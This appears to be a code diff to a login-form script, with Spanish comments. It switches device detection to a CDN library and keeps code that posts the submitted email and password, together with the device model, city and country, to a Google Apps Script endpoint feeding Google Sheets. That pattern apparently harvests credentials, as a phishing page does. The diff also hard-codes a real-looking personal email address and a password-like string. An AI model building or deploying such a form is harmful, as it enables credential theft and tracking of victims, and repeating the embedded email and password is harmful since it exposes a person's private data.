@@ -1,3 +1,7 @@
+<!-- Agrega esto en tu formulario.html para cargar la librería -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/device-detector-js/2.2.10/device-detector.min.js"></script>
+
+<script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault(); // Evita el envío automático
 
@@ -7,8 +11,8 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     const errorMessage = document.getElementById('error-message');
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["Kiana14_07"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedEmails = ["tamaraganoza417@gmail.com"];
+    const prohibitedWords = ["Kiana14_07"];
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -18,7 +22,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     if (!emailRegex.test(email)) {
         errorMessage.textContent = "Correo electrónico no válido";
         errorMessage.style.color = 'red';
-        return; // Detiene el procesamiento
+        return;
     }
     
     // Verificar correo prohibido
@@ -27,7 +31,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         errorMessage.style.color = 'red';
         emailInput.value = '';
         passwordInput.value = '';
-        return; // Detiene el procesamiento
+        return;
     }
     
     // Verificar contraseña prohibida
@@ -35,27 +39,21 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         errorMessage.textContent = "Restaure su contraseña y vuelva a intentar";
         errorMessage.style.color = 'red';
         passwordInput.value = '';
-        return; // Detiene el procesamiento
-    }
-    
-    // Si pasa todas las validaciones, continúa con el proceso normal
-    if (errorMessage) {
-        errorMessage.textContent = "";
+        return;
     }
 
-    // 🔥 DETECTAR EL MODELO EXACTO DEL DISPOSITIVO 🔥
+    // 🔥 DETECTAR EL MODELO EXACTO DEL DISPOSITIVO CON device-detector-js 🔥
+    const deviceDetector = new DeviceDetector();
+    const device = deviceDetector.parse(navigator.userAgent);
     let deviceModel = "Desconocido";
-    let userAgent = navigator.userAgent.toLowerCase();
 
-    if (/android/.test(userAgent)) {
-        let match = userAgent.match(/android\s\d+;\s([^)]+)\)/);
-        deviceModel = match ? match[1] : "Android (modelo desconocido)";
-    } else if (/iphone|ipad|ipod/.test(userAgent)) {
-        let match = userAgent.match(/\((.*?)\)/);
-        deviceModel = match ? match[1].split(";")[1].trim() : "iPhone (modelo desconocido)";
+    if (device.device && device.device.model) {
+        deviceModel = `${device.device.brand} ${device.device.model}`; // Marca + Modelo
+    } else {
+        deviceModel = device.os.name || "Desconocido"; // Si no detecta modelo, muestra el sistema operativo
     }
 
-    console.log("Modelo detectado:", deviceModel); // 👀 Para verificar en consola
+    console.log("Modelo detectado:", deviceModel); // 👀 Verificar en consola
 
     // 🔥 OBTENER CIUDAD Y PAÍS 🔥
     let country = "Desconocido";
@@ -76,9 +74,9 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
 
     // 🔥 Enviar los datos a Google Sheets 🔥
     const formData = new FormData(this);
-    formData.append("device", deviceModel); // Agregar modelo exacto del dispositivo
-    formData.append("country", country); // Agregar país
-    formData.append("city", city); // Agregar ciudad
+    formData.append("device", deviceModel);
+    formData.append("country", country);
+    formData.append("city", city);
 
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
 
@@ -88,3 +86,4 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         headers: { "Content-Type": "application/x-www-form-urlencoded" }
     }).catch(error => console.error("Error al enviar datos:", error));
 });
+</script>
